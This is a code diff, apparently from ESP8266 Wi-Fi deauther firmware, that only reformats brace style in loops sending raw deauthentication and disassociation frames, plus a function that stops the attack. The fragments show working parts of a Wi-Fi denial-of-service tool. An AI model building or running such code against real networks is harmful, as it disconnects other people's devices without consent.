@@ -63,13 +63,15 @@ void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t rea
 
   // Deauth from AP to client - 5 times
   deauthPacket[0] = 0xC0;
-  for (int i = 0; i < 5; i++) {
+  for (int i = 0; i < 5; i++)
+  {
     wifi_send_pkt_freedom(deauthPacket, 26, 0);
   }
 
   // Disassociation from AP to client - 5 times
   deauthPacket[0] = 0xA0;
-  for (int i = 0; i < 5; i++) {
+  for (int i = 0; i < 5; i++)
+  {
     wifi_send_pkt_freedom(deauthPacket, 26, 0);
   }
 
@@ -81,12 +83,14 @@ void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t rea
     memcpy(&deauthPacket[16], apMac, 6);     // BSSID = AP
 
     deauthPacket[0] = 0xC0;
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 5; i++)
+    {
       wifi_send_pkt_freedom(deauthPacket, 26, 0);
     }
 
     deauthPacket[0] = 0xA0;
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 5; i++)
+    {
       wifi_send_pkt_freedom(deauthPacket, 26, 0);
     }
   }
@@ -120,7 +124,8 @@ void stopDeauthAttack()
   deautherRunning = false;
 
   // Reconnect STA if configured
-  if (wifiSsid.length() > 0) {
+  if (wifiSsid.length() > 0)
+  {
     WiFi.begin(wifiSsid.c_str(), wifiPassword.c_str());
   }
 }
